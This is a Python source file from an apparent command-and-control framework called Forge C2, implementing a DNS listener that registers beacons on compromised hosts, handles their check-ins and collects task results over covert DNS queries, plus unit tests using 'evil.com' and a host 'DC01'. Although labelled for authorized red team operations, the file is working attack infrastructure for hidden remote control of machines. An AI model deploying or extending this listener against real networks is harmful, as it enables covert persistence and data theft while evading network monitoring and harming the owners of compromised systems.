"""
Forge C2 — DNS Listener
===========================
DNS-based listener for covert C2 communication through DNS queries.

Delegates actual DNS I/O to the DNSTransport, handles the C2
protocol layer: beacon registration, check-in, and result routing.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import dataclass
from typing import Any, Callable

from forge_c2.beacon.beacon_core import Beacon, BeaconRegistry
from forge_c2.beacon.beacon_crypto import BeaconCrypto
from forge_c2.transport.dns_transport import DNSTransport, DNSConfig

log = logging.getLogger("forge.c2.listener.dns")


@dataclass
class DNSListenerConfig:
    """Configuration for DNS listener."""
    bind_host:   str = "0.0.0.0"
    bind_port:   int = 53
    domain:      str = "c2.example.com"
    record_type: str = "TXT"


class DNSListener:
    """DNS C2 listener — receives beacon comms over DNS queries.

    Usage::

        listener = DNSListener(
            config=DNSListenerConfig(domain="c2.evil.com"),
            registry=beacon_registry,
            crypto=beacon_crypto,
        )
        await listener.start()
    """

    def __init__(
        self,
        config: DNSListenerConfig | None = None,
        registry: BeaconRegistry | None = None,
        crypto: BeaconCrypto | None = None,
        event_bus: Any = None,
    ) -> None:
        self.config = config or DNSListenerConfig()
        self.registry = registry or BeaconRegistry()
        self.crypto = crypto or BeaconCrypto()
        self.event_bus = event_bus

        dns_config = DNSConfig(
            domain=self.config.domain,
            record_type=self.config.record_type,
        )
        self._transport = DNSTransport(config=dns_config, role="server")

        self._running: bool = False
        self._started_at: float = 0.0
        self._task: asyncio.Task | None = None

    async def start(self) -> None:
        """Start the DNS listener."""
        self._running = True
        self._started_at = time.time()

        connected = await self._transport.connect(
            self.config.bind_host, self.config.bind_port,
        )

        if not connected:
            log.error("DNS listener failed to start on %s:%d",
                      self.config.bind_host, self.config.bind_port)
            return

        log.info("═══ DNS LISTENER ONLINE ═══")
        log.info("Domain: %s | Bind: %s:%d | Record: %s",
                 self.config.domain, self.config.bind_host,
                 self.config.bind_port, self.config.record_type)

        # Process incoming DNS queries in a loop
        self._task = asyncio.create_task(
            self._process_loop(), name="dns_listener_loop",
        )

    async def stop(self) -> None:
        """Stop the DNS listener."""
        self._running = False
        await self._transport.disconnect()
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        log.info("DNS listener stopped")

    async def _process_loop(self) -> None:
        """Main processing loop — reads decoded data from transport."""
        while self._running:
            try:
                data = await self._transport.recv(timeout=5.0)
                if data:
                    await self._handle_dns_data(data)
            except asyncio.CancelledError:
                break
            except Exception as exc:
                log.debug("DNS listener loop error: %s", exc)

    async def _handle_dns_data(self, data: bytes) -> None:
        """Process decoded data from a DNS query."""
        try:
            payload = json.loads(data)
            cmd = payload.get("cmd", "checkin")
            beacon_id = payload.get("beacon_id", "")

            if cmd == "register":
                self._handle_register(payload)
            elif cmd == "checkin":
                self._handle_checkin(beacon_id)
            elif cmd == "result":
                self._handle_result(payload)

        except (json.JSONDecodeError, UnicodeDecodeError):
            # Raw data — treat as a check-in attempt
            log.debug("DNS: non-JSON data received (%d bytes)", len(data))

    def _handle_register(self, metadata: dict[str, Any]) -> None:
        """Register a new beacon from DNS query data."""
        beacon = self.registry.register(metadata=metadata, transport="dns")
        log.info("DNS BEACON REGISTERED: %s (hostname=%s)",
                 beacon.beacon_id, beacon.metadata.hostname)

    def _handle_checkin(self, beacon_id: str) -> None:
        """Process a DNS check-in."""
        beacon = self.registry.get(beacon_id)
        if beacon:
            beacon.checkin()

    def _handle_result(self, data: dict[str, Any]) -> None:
        """Process a task result submitted via DNS."""
        beacon_id = data.get("beacon_id", "")
        task_id = data.get("task_id", "")
        result = data.get("result", "")
        success = data.get("success", True)

        beacon = self.registry.get(beacon_id)
        if beacon:
            beacon.complete_task(task_id, result=result, success=success)

    def summary(self) -> dict[str, Any]:
        uptime = time.time() - self._started_at if self._started_at else 0
        return {
            "type": "dns",
            "domain": self.config.domain,
            "bind": f"{self.config.bind_host}:{self.config.bind_port}",
            "running": self._running,
            "uptime_seconds": round(uptime, 1),
            "transport_stats": self._transport.stats.to_dict(),
        }


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestDNSListener:
    """Tests for DNS listener."""

    def test_init(self) -> None:
        listener = DNSListener()
        assert listener.config.domain == "c2.example.com"
        assert listener.config.bind_port == 53

    def test_config(self) -> None:
        cfg = DNSListenerConfig(domain="evil.com", bind_port=5353)
        listener = DNSListener(config=cfg)
        assert listener.config.domain == "evil.com"

    def test_handle_register(self) -> None:
        listener = DNSListener()
        listener._handle_register({"hostname": "DC01", "username": "admin"})
        assert len(listener.registry.all_beacons()) == 1

    def test_summary(self) -> None:
        listener = DNSListener()
        s = listener.summary()
        assert s["type"] == "dns"
        assert "domain" in s
